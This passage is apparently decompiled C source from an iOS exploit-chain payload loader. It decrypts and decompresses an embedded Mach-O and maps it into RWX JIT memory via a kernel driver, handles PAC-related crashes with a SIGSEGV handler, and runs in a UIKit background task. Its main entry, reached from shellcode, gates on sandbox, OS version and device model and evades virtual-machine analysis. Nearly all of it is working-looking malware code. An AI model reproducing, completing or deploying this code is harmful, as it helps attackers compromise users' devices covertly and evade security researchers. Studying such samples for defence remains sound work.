static int32_t c2_command_handler(int64_t ctx, int64_t cmd_id,             // sub_A418
                                   int64_t response, int64_t response_len) {
    if (!ctx) return ERR_INVALID_ARG;

    if (!*(uint64_t *)(ctx + 272) || !cmd_id || !response || !response_len)
        return ERR_INVALID_ARG;

    int64_t parsed = 0;
    int32_t err = dispatch_call(ctx, cmd_id, (int64_t)&parsed);
    if (!err)
        return ERR_INVALID_ARG;

    return err;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  ObjC block helpers (used by exploit_entry for UIKit background task)
 * ═══════════════════════════════════════════════════════════════════════ */

/* Block expire handler — called when UIKit background time runs out */
static void bg_task_expire_handler(int64_t block) {                        // sub_6EC4
    id app = *(id *)(block + 32);
    uint64_t task_id = *(uint64_t *)(*(uint64_t *)(*(uint64_t *)(block + 40) + 8) + 24);
    objc_msgSend(app, sel_registerName("endBackgroundTask:"), task_id);
    *(uint64_t *)(*(uint64_t *)(*(uint64_t *)(block + 40) + 8) + 24) = ~(uint64_t)0;
}

/* Block copy helper — _Block_object_assign for captured vars */
static void block_copy_helper(int64_t dst, int64_t src) {                 // sub_6F30
    extern void _Block_object_assign(void *, const void *, int);
    _Block_object_assign((void *)(dst + 32), *(const void **)(src + 32), 3);
    _Block_object_assign((void *)(dst + 40), *(const void **)(src + 40), 8);
}

/* Block dispose helper */
static void block_dispose_helper(int64_t block) {                         // sub_6F94
    extern void _Block_object_dispose(const void *, int);
    _Block_object_dispose(*(const void **)(block + 40), 8);
    _Block_object_dispose(*(const void **)(block + 32), 3);
}

/* ═══════════════════════════════════════════════════════════════════════
 *  SIGSEGV handler — PAC crash recovery
 * ═══════════════════════════════════════════════════════════════════════ */

static int64_t sigaction_handler(int64_t sig, int64_t info,                // sub_6FEC
                                  int64_t ucontext) {
    int64_t *regs = *(int64_t **)(ucontext + 48);
    uint64_t pc = regs[34]; /* saved PC */

    if (pc >> 39 == 0x4000) {
        /* Already PAC-stripped — clear upper bits */
        regs[34] = pc & 0xFFDFFFFFFFFFFFFFULL;
        return regs[34];
    }

    int64_t x0 = regs[0];
    uint64_t upper = x0 & 0xFFFFFF8000000000ULL;

    if (upper == 0x2000000000000000ULL) {
        uint64_t stripped = x0 & 0x7FFFFFFFFFULL;
        if (stripped != (pc & 0x7FFFFFFFFFULL))
            abort();
        regs[34] = pac_sign_if_available(stripped, 29825);
    } else if (upper == 0x20000000000000ULL) {
        if ((x0 & 0x7FFFFFFFFFULL) != (pc & 0x7FFFFFFFFFULL))
            abort();
        regs[34] = pac_sign_if_available(x0 & 0x7FFFFFFFFFULL, 29825);
    } else {
        abort();
    }

    return regs[34];
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Dylib loader — maps Mach-O from memory
 *
 *  sub_5FEC: 2284 bytes. Handles:
 *  1. ChaCha20 decryption (if key at ctx+152)
 *  2. LZMA decompression
 *  3. C2 command handler to parse config
 *  4. task_info(TASK_DYLD_INFO) to find dyld shared cache
 *  5. Driver module loading for JIT write primitives
 *  6. mmap + vm_allocate + vm_protect for code mapping
 *  7. _start symbol resolution
 *  8. Code cache flush
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t load_dylib_from_memory(int64_t ctx, int64_t macho_data,     // sub_5FEC
                                       int flags, uint32_t *entry_out, ...) {
    int64_t header[1] = {0};
    int32_t err;

    if (ctx && *(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
        dispatch_call(ctx, 835585, 0); /* log: begin loading */

    err = dispatch_call(ctx, macho_data, (int64_t)header);
    if (err) {
        if (*(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
            dispatch_call(ctx, err, 0);
        return err;
    }

    /* Decrypt with ChaCha20 if key present */
    if (*(uint64_t *)(ctx + 152))
        chacha20_block(ctx, 0, 0); /* key from ctx */

    /* Decompress */
    uint8_t *data_ptr = NULL;
    uint32_t data_size = 0;
    err = decompress_lzma(&data_ptr, &data_size);
    if (err) {
        if (*(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
            dispatch_call(ctx, err, 0);
        return err;
    }

    if (*(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
        dispatch_call(ctx, 835586, 0); /* log: decompressed */

    /* Parse config via C2 command handler */
    int64_t code_data = 0;
    uint32_t code_size = 0;
    dispatch_call(ctx, 458752, (int64_t)data_ptr);
    err = c2_command_handler(ctx, 458752, (int64_t)&code_data, (int64_t)&code_size);
    if (err) {
        if (*(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
            dispatch_call(ctx, err, 0);
        return err;
    }

    *(int64_t *)(ctx + 104) = code_data;
    *(uint32_t *)(ctx + 112) = code_size;

    if (*(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
        dispatch_call(ctx, 835587, 0); /* log: config parsed */

    /* Memory mapping logic — depends on JSC/sandbox flags */
    if (*(uint8_t *)(ctx + 1474) || *(uint8_t *)(ctx + 1475)) {
        /* Has existing memory region — use task_info to find it */
        if (!*(uint8_t *)(ctx + 1513) || *(uint8_t *)(ctx + 1512)) {
            *(uint8_t *)(ctx + 1476) = 1; /* mark ready */
            goto map_code;
        }

        /* Query TASK_DYLD_INFO for shared cache region */
        mach_msg_type_number_t info_cnt = 5;
        int64_t dyld_info[3] = {0};
        kern_return_t kr = task_info(mach_task_self(), 0x11,
            (task_info_t)dyld_info, &info_cnt);
        if (kr) return kr | 0x80000000;
        if (!dyld_info[0]) return 20487;

        vm_address_t shared_cache = *(uint64_t *)(dyld_info[0] + 40) & ~1ULL;
        if (shared_cache) {
            vm_address_t address = *(uint64_t *)shared_cache;
            if (!address) return 4097;
            /* Setup JIT write region */
        } else {
            /* No shared cache — use driver for JIT write */
            uint64_t driver = 0;
            int64_t driver_addr = 0;
            uint64_t cb_data = 0;
            uint32_t cb_size = 0;

            err = dispatch_call(ctx, 327680, (int64_t)&cb_data);
            if (err) return err;

            err = load_driver(ctx, 589825, &driver);
            if (err) return err;

            err = driver_dispatch(driver, 0, (int64_t)&driver_addr);
            if (err) goto cleanup_driver;

            err = driver_call(driver, driver_addr, 3221225499LL /* 0xC000000B */);
            if (err) goto cleanup_driver;

            err = driver_call(driver, driver_addr, 13);
            if (err) goto cleanup_driver;

            /* mmap 16MB RWX region */
            void *jit_region = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE,
                                    MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
            if (jit_region == MAP_FAILED) {
                int e = *__error();
                err = (e < 0 ? -e : e) | 0x40000000;
                goto cleanup_driver;
            }

            /* Allocate backing VM region */
            vm_address_t address = 0;
            kr = vm_allocate(mach_task_self(), &address, 0x1000000, 1);
            if (kr) { err = kr | 0x80000000; goto cleanup_driver; }

            *(uint64_t *)jit_region = address;
            memcpy((uint8_t *)jit_region + vm_page_size, (void *)cb_data, cb_size);

            kr = vm_protect(mach_task_self(), (vm_address_t)jit_region,
                           0x1000000, 0, VM_PROT_ALL);
            if (kr) { err = kr | 0x80000000; goto cleanup_driver; }

            err = driver_call(driver, driver_addr, 38);
            if (!err)
                *(uint64_t *)(dyld_info[0] + 40) = (*(uint64_t *)(dyld_info[0] + 40) & 1) | (uint64_t)jit_region;

cleanup_driver:
            if (driver) {
                if (driver_addr)
                    driver_call_v2(driver, driver_addr, 0);
                release_driver(ctx, (uint64_t *)driver);
            }
            if (err) return err;
        }

        /* Setup execution region pointers */
        vm_address_t address = 0; /* from above */
        *(uint64_t *)(ctx + 136) = address + 0x100000;
        *(uint32_t *)(ctx + 144) = 15728640; /* 0xF00000 */
        *(uint64_t *)(ctx + 312) = address + 16777212;
        *(uint64_t *)(ctx + 1488) = 0; /* jit_region */
        *(uint64_t *)(ctx + 1496) = address;
        *(uint32_t *)(ctx + 80) = 0;
        *(uint64_t *)(ctx + 296) = (uint64_t)pool_alloc;
        *(uint64_t *)(ctx + 40)  = (uint64_t)pool_consume;
        *(uint64_t *)(ctx + 176) = (uint64_t)secure_zero;
        *(uint8_t *)(ctx + 1479) = 1;
        *(uint16_t *)(ctx + 1476) = 1;

    } else {
        /* Non-sandbox path: query TASK_DYLD_INFO */
        mach_msg_type_number_t info_cnt = 5;
        int64_t dyld_info[3] = {0};
        if (task_info(mach_task_self(), 0x11, (task_info_t)dyld_info, &info_cnt)
            || !dyld_info[0])
            return 20487;

        uint64_t sc_addr = *(uint64_t *)(dyld_info[0] + 40) & ~1ULL;
        if (sc_addr) {
            if ((vm_page_mask & sc_addr) != 0) return 20486;
            *(uint64_t *)(ctx + 312) = 0;
            *(uint64_t *)(ctx + 136) = sc_addr;
            *(uint32_t *)(ctx + 144) = 0x1000000;
            *(uint32_t *)(ctx + 80) = 0;
            *(uint64_t *)(ctx + 1488) = 0;
            *(uint64_t *)(ctx + 1496) = 0;
        } else {
            /* Load driver and mmap fallback */
            uint64_t drv = 0;
            err = load_default_driver(ctx, &drv);
            if (!err) {
                int64_t addr = 0;
                err = driver_dispatch(drv, 0, (int64_t)&addr);
                if (!err) {
                    err = driver_call(drv, addr, 13);
                    driver_call_v2(drv, addr, 0);
                }
                release_driver(ctx, (uint64_t *)drv);
            }

            if (err == 28675) {
                *(uint8_t *)(ctx + 1476) = 1;
                goto map_code;
            }
            if (err) return err;

            void *region = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC,
                               MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
            if (region == MAP_FAILED) return 20488;

            *(uint64_t *)(ctx + 312) = 0;
            *(uint64_t *)(ctx + 136) = (uint64_t)region;
            *(uint32_t *)(ctx + 144) = 0x1000000;
            *(uint32_t *)(ctx + 80) = 0;
            *(uint64_t *)(ctx + 1488) = 0;
            *(uint64_t *)(ctx + 1496) = 0;
            *(uint64_t *)(dyld_info[0] + 40) = (*(uint64_t *)(dyld_info[0] + 40) & 1) | (uint64_t)region;
        }
    }

map_code:
    if (*(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
        dispatch_call(ctx, 835588, 0); /* log: mapping code */

    /* Resolve _start entry point */
    vm_address_t start_addr = 0;
    err = dispatch_call(ctx, 0x80000, 0);
    if (err) return err;

    err = dispatch_call(ctx, 0x80000, (int64_t)&start_addr);
    if (err) return err;
    if (!start_addr) return 20484;

    /* Debug callback for mapped segment info */
    if (*(uint64_t *)(ctx + 288))
        dispatch_call(ctx, *(int64_t *)(start_addr + 88), *(uint32_t *)(start_addr + 168));

    err = dispatch_call(ctx, start_addr, (int64_t)"_start");
    if (err) return err;
    if (!start_addr) return 20485;

    if (*(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
        dispatch_call(ctx, 835589, 0); /* log: resolved _start */

    int64_t result = dispatch_call(ctx, 0, 0);

    if (*(uint8_t *)(ctx + 1515) && *(uint64_t *)(ctx + 1520))
        dispatch_call(ctx, result, 0);

    dispatch_call(ctx, 0x80000, 0);
    *entry_out = result;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Exploit entry — UIApplication background task
 * ═══════════════════════════════════════════════════════════════════════ */

extern void *_NSConcreteStackBlock;
extern id OBJC_CLASS_$_UIApplication;
static const uint64_t UIBackgroundTaskInvalid = ~(uint64_t)0;

static int32_t exploit_entry(int64_t ctx) {                                // sub_6C44
    int32_t result = ERR_ALLOC_FAIL;
    uint32_t entry_code = 708608;
    int has_sigaction = 0;

    /* Install SIGSEGV handler if PAC is available and OS <= 14.x */
    if (*(uint16_t *)(ctx + 194) > 14 || !pac_check()) {
        /* Skip sigaction setup */
    } else {
        struct sigaction sa;
        sa.__sigaction_u.__sa_handler = (void (*)(int))pac_sign_if_available(
            (uint64_t)sigaction_handler, 0);
        *(uint64_t *)&sa.sa_mask = 0x4000000000ULL; /* SA_SIGINFO */

        struct sigaction old_sa;
        if (!sigaction(SIGSEGV, &sa, &old_sa))
            has_sigaction = 1;
        else {
            int e = *__error();
            return (e < 0 ? -e : e) | 0x40000000;
        }
    }

    /* Setup ObjC block for background task expiration handler */
    struct {
        void     *isa;          /* _NSConcreteStackBlock or PAC-signed */
        int64_t   flags;        /* 0xC2000000 */
        uint64_t  invoke;       /* bg_task_expire_handler (PAC-signed) */
        void     *descriptor;   /* block descriptor (unk_C090) */
        id        app;          /* UIApplication instance */
        void     *ctx_ref;      /* pointer to sigaction context */
    } block;

    block.flags = 0xC2000000LL;
    block.invoke = (uint64_t)bg_task_expire_handler;

    /* Allocate UIApplication */
    UIApplication *app = (UIApplication *)objc_alloc((Class)&OBJC_CLASS_$_UIApplication);
    if (!app) goto cleanup;

    /* PAC-sign block if needed */
    if (pac_check()) {
        block.isa = (void *)pac_sign_block((int64_t)&_NSConcreteStackBlock,
            (uint64_t)&block | 0x6AE1000000000000ULL);
        block.invoke = (uint64_t)pac_sign_func_ptr;
    } else {
        block.isa = &_NSConcreteStackBlock;
    }
    block.app = (id)app;

    /* Begin background task */
    void *task_result = objc_msgSend((id)app,
        sel_registerName("beginBackgroundTaskWithExpirationHandler:"),
        &block);

    /* Load and execute dylib */
    int64_t code_base = *(int64_t *)(ctx + 128);
    if (code_base) {
        uint32_t err = load_dylib_from_memory(ctx, code_base, 0, &entry_code);
        if (err)
            result = err;
        else
            result = entry_code;
    } else {
        result = 0;
    }

    /* End background task */
    if (task_result != (void *)UIBackgroundTaskInvalid) {
        objc_msgSend((id)app, sel_registerName("endBackgroundTask:"), task_result);
    }

    /* Restore sigaction if installed */
    if (has_sigaction) {
        struct sigaction old_sa = {0};
        if (sigaction(SIGSEGV, &old_sa, NULL)) {
            int e = *__error();
            result = (e < 0 ? -e : e) | 0x40000000;
        }
    }

    /* Exit cleanly for MobileStore payload */
    if (*(uint8_t *)(ctx + 1516))
        exit(0);

cleanup:
    return result;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Main entry point — _process (called by shellcode)
 * ═══════════════════════════════════════════════════════════════════════ */

static void *worker_thread(void *arg) {
    int64_t ctx = (int64_t)arg;
    exploit_entry(ctx);
    free(arg);
    return NULL;
}

static int32_t process_main(int64_t ctx, ...) {                            // _process / sub_68D8
    int32_t err;

    if (!ctx) return ERR_INVALID_ARG;

    /* Phase 1: Initialize callbacks and semaphore */
    err = init_callbacks(ctx);
    if (err) return err;

    /* Phase 2: Initialize callback table */
    err = init_callback_table((uint64_t *)ctx);
    if (err) return err;

    /* Phase 3: Check WebContent sandbox + kernel version */
    err = check_webcontent_sandbox(ctx);
    if (err) return err;

    /* Phase 4: Detect User-Agent */
    err = detect_user_agent(ctx);
    if (err) return err;

    /* Phase 5: Build tag version gate */
    if ((uint64_t)(*(uint64_t *)(ctx + 208) - 0x18090006700000ULL) > 0xF090EFE400003ULL)
        return ERR_NOT_SUPPORTED;

    /* Phase 6: Sandbox + hardware model gate */
    if (*(uint8_t *)(ctx + 1512)) {
        uint32_t osver = *(uint32_t *)(ctx + 192);
        if (osver < 0x100000) return 159753;
        if (osver >= 0x100401) {
            int32_t model = *(int32_t *)(ctx + 224);
            if (model != 1176831186 && model != 458787763
                && model != -2023363094 && model != -634136515)
                return 159753;
        }
    }

    /* Phase 7: Anti-VM check (serial number + Corellium) */
    uint8_t serial[64];
    serial[0] = 1;
    int sn_result = get_device_serial(serial);
    uint32_t status = sn_result ? ERR_DECOMPRESS : (!serial[0] ? ERR_VM_DETECTED : 0);
    if (status) return status;

    /* Phase 8: Hardware fingerprinting */
    uint32_t osver = *(uint32_t *)(ctx + 192);
    if (osver <= 0x1102FF) {
        /* Check L2 cache size — small = likely VM */
        if (osver >= 0xE0000) {
            size_t l2_size = 0;
            size_t l2_len = 8;
            int rc = sysctlbyname("hw.l2cachesize", &l2_size, &l2_len, NULL, 0);
            if (!(l2_size >> 20))
                status = ERR_VM_DETECTED;
            else
                status = 0;
            if (rc || l2_size >= 0x100000)
                ;
            else if (status)
                return status;
        }

        /* Check boot args */
        char bootargs[1024];
        size_t bootargs_len = 1024;
        bzero(bootargs, 1024);
        if (!sysctlbyname("kern.bootargs", bootargs, &bootargs_len, NULL, 0)
            && bootargs[0]
            && (bootargs[0] != ' ' || bootargs[1]))
            return ERR_VM_DETECTED;

        /* Check physical memory via host_info */
        if (*(uint32_t *)(ctx + 192) <= 0xF0000) {
            int count = 1;
            uint64_t physmem = 0;
            kern_return_t kr = host_info(mach_host_self(), 11,
                (host_info_t)&physmem, (mach_msg_type_number_t *)&count);
            if (!kr && physmem != 0)
                return ERR_VM_DETECTED;
        }
    }

    /* Phase 9: Prepare environment + launch worker */
    err = prepare_environment(ctx);
    if (err) return err;

    uint64_t *ctx_copy = (uint64_t *)malloc(0x648);
    if (!ctx_copy) return ERR_ALLOC_FAIL;

    memcpy(ctx_copy, (void *)ctx, 0x648);

    /* Deep-copy string fields and sub-structs */
    if (ctx_copy[16]) { /* user_agent offset 128 */
        char *dup = strdup((const char *)ctx_copy[16]);
        if (!dup) return ERR_ALLOC_FAIL;
        ctx_copy[16] = (uint64_t)dup;
    }
    if (ctx_copy[19]) { /* 32-byte struct at offset 152 */
        void *dup = malloc(32);
        if (!dup) return ERR_ALLOC_FAIL;
        memcpy(dup, (void *)ctx_copy[19], 32);
        ctx_copy[19] = (uint64_t)dup;
    }
    if (ctx_copy[15]) { /* c2_url offset 120 */
        char *dup = strdup((const char *)ctx_copy[15]);
        if (!dup) return ERR_ALLOC_FAIL;
        ctx_copy[15] = (uint64_t)dup;
    }
    if (ctx_copy[20]) {
        char *dup = strdup((const char *)ctx_copy[20]);
        if (!dup) return ERR_ALLOC_FAIL;
        ctx_copy[20] = (uint64_t)dup;
    }
    if (ctx_copy[21]) {
        char *dup = strdup((const char *)ctx_copy[21]);
        if (!dup) return ERR_ALLOC_FAIL;
        ctx_copy[21] = (uint64_t)dup;
    }

    /* Launch detached worker thread */
    pthread_attr_t attr;
    if (pthread_attr_init(&attr)) return ERR_THREAD_INIT;
    if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        return ERR_THREAD_INIT;

    pac_strip();
    void *(*thread_fn)(void *) = (void *(*)(void *))pac_sign_func_ptr;

    pthread_t thread;
    if (pthread_create(&thread, &attr, thread_fn, ctx_copy))
        err = ERR_THREAD_CREATE;
    else
        err = 0;

    pthread_attr_destroy(&attr);
    return err;
}
